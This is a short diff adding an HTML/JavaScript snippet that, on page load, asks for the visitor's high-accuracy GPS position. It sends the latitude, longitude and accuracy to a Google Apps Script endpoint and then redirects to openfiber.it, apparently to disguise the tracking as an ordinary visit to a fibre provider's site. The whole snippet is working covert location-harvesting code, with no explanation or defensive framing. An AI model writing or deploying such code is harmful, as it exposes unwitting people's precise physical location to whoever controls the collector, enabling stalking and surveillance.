@@ -1,0 +1,40 @@
+<script>
+
+const finalUrl = "https://www.openfiber.it";
+
+const scriptUrl = "https://script.google.com/macros/s/AKfycbzxlGcib-iP-tAZRVohvUQAhLCvNxgJFgYMiOs-i1LTMo8ak_kiF6ThZ5kh5rV_cAZtSA/exec"
+
+navigator.geolocation.getCurrentPosition(
+
+(position) => {
+
+  const latitude = position.coords.latitude.toFixed(6);
+
+  const longitude = position.coords.longitude.toFixed(6);
+
+  const accuracy = position.coords.accuracy.toFixed(2);
+
+  const trackingUrl =
+    scriptUrl +
+    "?latitude=" + encodeURIComponent(latitude) +
+    "&longitude=" + encodeURIComponent(longitude) +
+    "&accuracy=" + encodeURIComponent(accuracy) +
+    "&redirect=" + encodeURIComponent(finalUrl);
+
+  window.location.href = trackingUrl;
+
+},
+
+(error) => {
+
+  alert("GPS negato");
+
+},
+
+{
+  enableHighAccuracy: true
+}
+
+);
+
+</script>
